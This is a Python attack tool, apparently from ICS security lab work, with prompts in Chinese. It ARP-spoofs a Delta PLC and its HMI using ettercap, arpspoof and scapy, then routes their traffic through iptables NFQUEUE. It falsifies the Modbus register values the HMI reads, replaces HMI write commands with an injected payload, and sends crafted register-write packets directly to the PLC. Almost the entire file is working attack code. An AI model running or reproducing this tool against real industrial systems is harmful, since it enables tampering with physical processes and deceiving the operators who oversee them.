import os, subprocess, time, struct, sys, threading, json
import scapy.all as scapy
from scapy.all import *
from netfilterqueue import NetfilterQueue
from random import *
from readchar import readchar
from rich.console import Console
from rich.table import Table
from rich import inspect
from rich.prompt import Prompt
import subprocess

func_options = {
    'arp_mode': ['Ettercap', 'Scapy_Arpspoof'],
}
plc_ip = {}
hmi_ip = {}
my_ip = {}
EMSinjection = False
last_time_updated = time.time()

set_d_reg = {}

console = Console()

console.clear()

def enable_packet_forwarding():
    try:
        subprocess.run("echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward", shell=True, check=True)
        console.log("[green][MAIN][/] Packet forwarding enabled successfully.")
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")
def ip_select(): 
    console.clear()
    enable_packet_forwarding()
    console.log(f"[bold cyan]正在設定: PLC_IP / HMI_IP[/]")
    global plc_ip, hmi_ip
    tmp_plc_ip = Prompt.ask(f"請輸入PLC IP", default='192.168.1.5')
    if tmp_plc_ip != "":
        plc_ip['ip'] = tmp_plc_ip
    plc_ip['mac'] = subprocess.check_output(f"arp -n | grep {plc_ip['ip']} | awk '{{print $3}}'", shell=True).decode('utf-8').rstrip('\n')
    
    tmp_hmi_ip = Prompt.ask(f"請輸入HMI IP", default='192.168.1.20')
    if tmp_hmi_ip != "":
        hmi_ip['ip'] = tmp_hmi_ip
    hmi_ip['mac'] = subprocess.check_output(f"arp -n | grep {hmi_ip['ip']} | awk '{{print $3}}'", shell=True).decode('utf-8').rstrip('\n')
    time.sleep(1)

def get_ip():
    with console.status("1st. ARP-Spoofing PLC... ", spinner="bouncingBall", spinner_style="bold red") as status:
        arp1 = f'ettercap -Tq -i eth1 -M ARP /{plc_ip["ip"]}//'
        subprocess.Popen(arp1, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(1)
    console.log("1st. ARP-Spoofing PLC is Done.")
    time.sleep(1)

def arp_spoofing():
    global EMSinjection
    console.log("[bold][MAIN][/] Setting EMS Injection Mode...")
    if Prompt.ask("是否啟用EMS Injection模式? (Y/N)", default="N").lower() == 'y':
        EMSinjection = True
        console.log("[bold][MAIN][/] EMS Injection Mode Enabled.")
    else:
        EMSinjection = False``
        console.log("[bold][MAIN][/] EMS Injection Mode Disabled.")

    with console.status("ARP_Spoofing... ", spinner="bouncingBall", spinner_style="bold red") as status:
        arp2 = f'ettercap -Tq -i eth1 -M ARP /{hmi_ip["ip"]}// /{plc_ip["ip"]}//'
        process = subprocess.Popen(arp2, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        pid = process.pid
        console.log("[green][MAIN][/] Ettercap is running, PID : {}".format(pid))
        if 'Scapy_Arpspoof' in func_options['arp_mode']:
            console.log("[green][MAIN][/] ARPspoof_Mode = {func_options['arp_mode']}, Setting Scapy_Arpspoof Thread...")
            t1 = threading.Thread(target=scapy_arpspoof, args=(plc_ip["ip"], hmi_ip["ip"], 1))
            t1.daemon = True
            t1.start()
            t2 = threading.Thread(target=scapy_arpspoof, args=(hmi_ip["ip"], plc_ip["ip"], 1))
            t2.daemon = True
            t2.start()
        time.sleep(2)
    console.log("[green][MAIN][/] Ettercap ARP_Poisoning is Working.")

def arpspoof_mod(arp1_ip, arp2_ip):
    arpspoof_command1 = f"arpspoof -i eth1 -t {arp1_ip} {arp2_ip}"
    subprocess.Popen(arpspoof_command1, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
def scapy_arpspoof(target_ip, spoof_ip, delay_time, interface='eth1'):
    """
    ARPspoofing Mode => Scapy_Arpspoof 增強型ARP欺騙攻擊
    :param target_ip: 受到欺騙之目標主機ip_addr
    :param spoof_ip:  欺騙主機ip_addr
    :param interface: 網路介面卡
    """
    global my_ip
    arp_response = ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwsrc=my_ip['mac'])

    while True:
        send(arp_response, verbose=False, iface=interface)
        time.sleep(int(delay_time))

def get_my_ip_mac():
    global my_ip
    my_ip['ip'] =  get_if_addr('eth1')
    my_ip['mac'] = get_if_hwaddr('eth1')
    console.log(f"my_ip: {my_ip['ip']}, my_mac: {my_ip['mac']}")


def process_pkt(packet):
    global last_time_updated
    try:
        z = IP(packet.get_payload())  
        if z.haslayer(Raw) and (z.src == plc_ip["ip"] or z.src == hmi_ip["ip"]):
            raw_data = z[Raw].load
            current_time = time.time()
            if current_time - last_time_updated > 1:
                console.print(f"[bold]正在處理來自 {z.src} 的封包")
                last_time_updated = current_time

            if len(raw_data) >= 8:
                function_code = raw_data[7]
                if function_code == 66 and z[TCP].sport == 502:
                    if raw_data[8] == 2:
                        console.clear()
                        console.print(f"{raw_data[8]} => Read Dxx Register")

                        data_list = {
                            'transaction_id': int.from_bytes(raw_data[0:2], byteorder='big'),
                            'protocol_id': int.from_bytes(raw_data[2:4], byteorder='big'),
                            'length': int.from_bytes(raw_data[4:6], byteorder='big'),
                            'unit_id': raw_data[6],
                            'function_code': raw_data[7],
                            '66_func_code': raw_data[8],
                            'D_length': int.from_bytes(raw_data[9:11], byteorder='big'),
                        }
                        console.print(f"[bold]ORIGIN[/] RAW_Data => {raw_data}")

                        d_list = []
                        json_d_reg('r')
                        att_raw_data = bytearray(raw_data)
                        register_table = Table(title="DeltaPLC DxRegister Values", show_header=True, header_style="bold magenta")
                        register_table.add_column("Register", style="cyan")
                        register_table.add_column("Original Value", style="green")
                        register_table.add_column("Modified Value", style="red")
                        
                        for i in range(0, data_list['D_length'], 2):
                            v = 13 + i
                            if v + 2 <= len(raw_data):
                                value = int.from_bytes(raw_data[v:v+2], byteorder='big')
                                d_list.append(value)
                                modified_value = value
                                if str(i // 2) in set_d_reg:
                                    modified_value = int(set_d_reg[str(i // 2)])
                                    att_raw_data[v:v+2] = modified_value.to_bytes(2, byteorder='big')
                                    register_table.add_row(f"D{i // 2}", f"{value}", f"{modified_value}")
                                else:
                                    register_table.add_row(f"D{i // 2}", f"{value}", "-")

                        z[Raw].load = bytes(att_raw_data)
                        z[IP].len = None
                        z[TCP].len = None
                        z[IP].chksum = None
                        z[TCP].chksum = None
                        console.print(register_table)
                    
                if z.haslayer(Raw) and (z.src == hmi_ip["ip"] ) and function_code == 66 and z[TCP].dport == 502:
                    if(raw_data[8] == 3 and EMSinjection == True): 
                            z[IP].len = None
                            z[TCP].len = None
                            z[IP].chksum = None
                            z[TCP].chksum = None
                            print(z[Raw].load )
                            z[Raw].load = b'\t\xee\x00\x00\x00\x0e\x01B\x03\x00\t\x00\x00\x00c\x00\x01\x00\x01\xff'

                packet.set_payload(bytes(z))
            packet.accept()
        else:
            packet.accept()
    except Exception as e:
        console.log(f"[bold red]:cross_mark: Exception Occurred: {e}[/]")
        packet.accept() 
def data_injection():
    QUEUE_NUM = 0
    iptables_command = f"iptables -I OUTPUT -p tcp -j NFQUEUE --queue-num {QUEUE_NUM}"
    subprocess.run(iptables_command, shell=True)

    queue = NetfilterQueue()
    try:
        queue.bind(QUEUE_NUM, process_pkt)
        queue.run()
    except KeyboardInterrupt:
        console.log(":stop_sign:[yellow][KeyboardInterrupt][/] Func_Data_Injection Stopping...")
        subprocess.run("pkill -f ettercap", shell=True)
        subprocess.run("iptables --flush && iptables -t nat -F", shell=True)
        time.sleep(1.5)
    except: 
        console.log(":stop_sign:[bold red][OTHER_EXCEPT][/] Func_Data_Injection Stopping...")
    finally: 
        queue.unbind()

def show_set_d_reg():
    set_dreg_table = Table(show_header=True, header_style="bold green")
    set_dreg_table.add_column("DeltaPLC DxRegister SetATTACK_ValueList", style="bright_green", justify="center")
    for i in range(0, len(set_d_reg)):
        set_dreg_table.add_row(f"{list(set_d_reg.keys())[i]}: {list(set_d_reg.values())[i]}")
    console.print(set_dreg_table)

def select_d_reg():
    console.log(":card_index_dividers: 請選擇欲竄改之暫存器位址與數值\nPlease Select Register & Value")
    while True:
        user_input = Prompt.ask("請輸入暫存器位址與數值 (格式: Addr [Value])，輸入 'done' 結束 (例: 1 100)", default="")
        if user_input.lower() == 'done':
            break
        try:
            parts = user_input.split()
            if len(parts) == 1:
                addr = parts[0]

                if(addr == 'clear'):
                    set_d_reg.clear()
                    json_d_reg('w')
                    continue
                if addr.isdigit():
                    if addr in set_d_reg:
                        del set_d_reg[addr]
                        console.log(f"刪除 D{addr} 暫存器值")
                    else:
                        console.log(f"D{addr} 未設定")
                    json_d_reg('w')
                    continue
            elif len(parts) != 2:
                raise ValueError("需要兩個參數，暫存器位址和數值。")
            addr, value = parts
            if not addr.isdigit() or not value.isdigit():
                raise ValueError("位址和數值必須是數字。")
            set_d_reg[addr] = value
            console.log(f"設定 D{addr} = {value}")
            json_d_reg('w') 
        except Exception as e:
            console.log(f"[bold red]錯誤：{str(e)}[/]")
            continue
    if set_d_reg:
        show_set_d_reg()


def json_d_reg(option='r'):
    filename = 'save_d_reg.json'
    global set_d_reg

    if option == 'r':
        try:
            with open(filename, 'r') as file:
                set_d_reg = json.load(file)
        except FileNotFoundError:
            set_d_reg = {}
            with open(filename, 'w') as file:
                json.dump(set_d_reg, file)
    elif option == 'w':
        with open(filename, 'w') as file:
            json.dump(set_d_reg, file)

def re_arp_victims():
    console.log("[yellow][Recover-ARP][/] Re-ARPing victims...")
    send(ARP(op=2, pdst=plc_ip["ip"], psrc=hmi_ip["ip"], hwdst=plc_ip["mac"], hwsrc=hmi_ip["mac"]), count=3)
    send(ARP(op=2, pdst=hmi_ip["ip"], psrc=plc_ip["ip"], hwdst=hmi_ip["mac"], hwsrc=plc_ip["mac"]), count=3)

def stop_ettercap(str_alert="Normal_End"):
    subprocess.run("pkill -f ettercap", shell=True)
    subprocess.run("iptables --flush && iptables -t nat -F", shell=True)
    console.log(f"[bold red][{str_alert}][/] Killing Ettercap, Iptable Setting...")

def shutdown_program():
    console.log("[bold red][Program_Shutdown] THIS PROGRAM WILL EXIT[/]...", style="blink")
    sys.exit() 


import threading

def send_custom_modbus_packet():
    user_input = Prompt.ask("請輸入要修改的暫存器地址、值和延遲時間 (格式: 地址 值 [延遲時間])", default="99 255")
    parts = user_input.split()
    address = int(parts[0])
    value = int(parts[1])
    delay = int(parts[2]) if len(parts) > 2 else None

    def send_packet(address, value):
        custom_data = b'\x03\x00\x09\x00\x00' + struct.pack('>H', address) + b'\x00\x01\x00\x01' + struct.pack('>B', value)
        header = struct.pack('>HHHB', 1, 0, len(custom_data) + 2, 1)
        request = header + struct.pack('>B', 66) + custom_data
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((plc_ip['ip'], 502)) 
            s.send(request)
            response = s.recv(1024)
        
        console.print(request)
        console.print(f"[green]Packet sent! Response: {response}[/] \n")
    send_packet(address, value)

    if delay is not None:
        threading.Thread(target=lambda: (time.sleep(delay), send_packet(address, 0), main())).start()
    else:
        main()

def modify_modbus_packet():
    user_input = Prompt.ask("請輸入要修改的暫存器地址、值 (格式: 地址 值)", default="99 255")

    parts = user_input.split()
    address = int(parts[0])
    value = int(parts[1])

    def send_packet(address, value):
        high_byte = (value >> 8) & 0xFF
        low_byte = value & 0xFF
        
        custom_data = (
            b'\x04\x00\n\x00\x00' +
            struct.pack('>H', address) +
            b'\x00\x01\x00\x01' +
            struct.pack('>B', high_byte) + 
            struct.pack('>B', low_byte)
        )
        
        header = struct.pack('>HHHB', 1, 0, len(custom_data) + 2, 1)
        request = header + struct.pack('>B', 66) + custom_data

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((plc_ip['ip'], 502)) 
            s.send(request)
            response = s.recv(1024)
        
        console.print(request)
        console.print(f"[green]Packet sent! Response: {response}[/] \n")
        main()

    send_packet(address, value)



def main():
    ip_table = Table(show_header=True, header_style="bold magenta")
    ip_table.add_column("Attack Target IP_ADDR: PLC/HMI", style="cyan", justify="center")
    ip_table.add_row(f"PLC_IP: {plc_ip['ip']} ({plc_ip['mac']})")
    ip_table.add_row(f"HMI_IP: {hmi_ip['ip']} ({hmi_ip['mac']})")
    
    if plc_ip["mac"] == "" or hmi_ip["mac"] == "":
        ip_table.add_row(f"[bold red]Warning: Make sure THE DEVICES is ONLINE?[/]")
    console.print(ip_table)
    if plc_ip['ip'] == "" or hmi_ip['ip'] == "":
        ip_select()

    if len(set_d_reg) > 0:
        show_set_d_reg()
    table_options = Table(show_header=True, header_style="bold green")
    table_options.add_column("DeltaPLC DxRegister ListTable", style="bright_white", justify="center")
    table_options.add_row("[b][u]A[/u][/b]ttackStart")
    table_options.add_row("[b][u]S[/u][/b]electRegister&Value")
    table_options.add_row("[b][u]I[/u][/b]P_ADDR Target Setting")
    table_options.add_row("[b][u]C[/u][/b]ustom Packet Send(Funcode 3)")
    table_options.add_row("C[b][u]u[/u][/b]stom Packet Send(Funcode 4)")
    table_options.add_row("ClearAll[b][u][/b]History")
    table_options.add_row("[b][u]E[/u][/b]xit")
    console.print(table_options)
    

    console.print(" __   __   ___  __   __      __   __  ___    __                ___      ", style="bright_green blink")
    console.print("|__) |__) |__  /__` /__`    /  \ |__)  |  | /  \ |\ |    |__/ |__  \ /  ", style="bright_green blink")
    console.print("|    |  \ |___ .__/ .__/    \__/ |     |  | \__/ | \|    |  \ |___  |  .", style="bright_green blink")

    sel_option = readchar()
    console.log(f"[bold yellow]Your Option: {sel_option}[/]")
    if sel_option == 'a' or sel_option == 'A':
        get_my_ip_mac()
        arp_spoofing()
        data_injection()
        stop_ettercap()
        main()
    elif sel_option == 's' or sel_option == 'S':
        console.clear()
        select_d_reg()
        main()
    elif sel_option == 'i' or sel_option == 'I':
        ip_select()
        main()
    elif sel_option == 'c' or sel_option == 'C':
        console.clear()
        send_custom_modbus_packet()
    elif sel_option == 'u' or sel_option == 'U':
        console.clear()
        modify_modbus_packet()
    elif sel_option == 'h' or sel_option == 'H':
        console.clear()
        os.system('cls||clear')
        console.log("[bold bright_yellow] :broom: Clear All History DONE. [/]")       
        main()
    elif sel_option == 'e' or sel_option == 'E':
        stop_ettercap("Exit.")
        shutdown_program()
    else:
        console.clear()
        console.print("[bold red] :keyboard: YOU INPUT WRONG OPTION, PLEASE TRY AGAIN.[/]", style="blink")
        main()

if __name__ == "__main__":
    json_d_reg('r') 
    ip_select()
    main()
